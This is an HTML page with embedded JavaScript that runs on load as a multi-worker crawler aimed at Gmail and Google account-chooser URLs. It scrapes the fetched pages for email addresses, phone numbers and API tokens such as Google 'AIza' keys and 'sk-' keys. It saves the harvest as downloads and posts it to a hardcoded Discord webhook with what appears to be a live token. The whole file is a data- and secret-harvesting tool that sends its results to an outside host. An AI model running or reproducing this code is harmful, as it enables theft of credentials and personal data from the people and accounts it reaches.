<!DOCTYPE html>
<html>
<body>
<script>

// ===== CONFIG =====
const TARGET_DOMAINS = [
  "https://mail.google.com/mail",
  "https://accounts.google.com/AccountChooser
"
];

const WEBHOOK = "https://discord.com/api/webhooks/1469344031371694254/D8F6QXpH0fs7CIPp7D9mjB35AtRi3kj2saow0qPm11A4KCa1LLDxT698Hgnc5DUv0LXJ";

const MAX_DEPTH = 3;
const WORKERS = 12; // Increase for more speed

// ===== DATA =====
const visited = new Set();
const siteMap = {};
const stats = { pages: 0, emails: 0, phones: 0, tokens: 0 };

// ===== PATTERNS =====
const patterns = {
  emails: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}/gi,
  phones: /\+?\d[\d\s\-().]{7,}/g,
  tokens: /(AIza[0-9A-Za-z-_]{20,}|sk-[A-Za-z0-9]{20,})/g
};

const results = {
  emails: new Set(),
  phones: new Set(),
  tokens: new Set()
};

// ===== WORKER CODE =====
const workerCode = `
self.onmessage = async e => {
  const { url, depth, maxDepth } = e.data;
  if (depth > maxDepth) return self.postMessage(null);

  try {
    const res = await fetch(url);
    const html = await res.text();

    const emails = html.match(${patterns.emails}) || [];
    const phones = html.match(${patterns.phones}) || [];
    const tokens = html.match(${patterns.tokens}) || [];

    const doc = new DOMParser().parseFromString(html, "text/html");
    const links = [...doc.querySelectorAll("a[href]")]
      .map(a => new URL(a.href, url).href)
      .filter(u => u.startsWith(url));

    self.postMessage({ url, emails, phones, tokens, links });
  } catch {
    self.postMessage(null);
  }
};
`;

const workerBlob = new Blob([workerCode], { type: "application/javascript" });
const workerURL = URL.createObjectURL(workerBlob);
const workers = Array.from({ length: WORKERS }, () => new Worker(workerURL));

// ===== QUEUE =====
const queue = [];
let active = 0;

function enqueue(url, depth) {
  if (visited.has(url)) return;
  visited.add(url);
  queue.push({ url, depth });
}

function updateStats() {
  console.clear();
  console.log("ðŸš€ LIVE SCAN STATUS");
  console.log("Pages scanned:", stats.pages);
  console.log("Emails found:", results.emails.size);
  console.log("Phones found:", results.phones.size);
  console.log("Tokens found:", results.tokens.size);
  console.log("Queue:", queue.length);
}

// ===== WORK LOOP =====
function runWorker(worker) {
  if (!queue.length) return;
  const job = queue.shift();
  active++;

  worker.postMessage({ ...job, maxDepth: MAX_DEPTH });

  worker.onmessage = e => {
    active--;

    const data = e.data;
    if (!data) return next(worker);

    stats.pages++;

    // Save map
    siteMap[data.url] = data.links;

    data.emails.forEach(v => results.emails.add(v));
    data.phones.forEach(v => results.phones.add(v));
    data.tokens.forEach(v => results.tokens.add(v));

    data.links.forEach(link => enqueue(link, job.depth + 1));

    updateStats();
    next(worker);
  };
}

function next(worker) {
  if (queue.length) runWorker(worker);
}

// ===== START =====
function start() {
  console.log("ðŸ”¥ Starting multiâ€‘domain ultra scanner");

  TARGET_DOMAINS.forEach(d => enqueue(d, 0));

  workers.forEach(runWorker);

  const interval = setInterval(() => {
    if (queue.length === 0 && active === 0) {
      clearInterval(interval);
      finish();
    }
  }, 500);
}

// ===== EXPORT =====
function download(filename, data) {
  const blob = new Blob([data], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.click();
}

async function finish() {
  console.log("âœ… SCAN COMPLETE");

  const output = {
    emails: [...results.emails],
    phones: [...results.phones],
    tokens: [...results.tokens],
    siteMap
  };

  console.log("RESULTS:", output);

  // JSON export
  download("results.json", JSON.stringify(output, null, 2));

  // CSV export
  download("emails.csv", [...results.emails].join("\n"));

  // Discord export
  if (WEBHOOK) {
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "Scan Results:\n```json\n" + JSON.stringify(output, null, 2) + "\n```"
      })
    });
  }
}

// RUN
start();

</script>
</body>
</html>
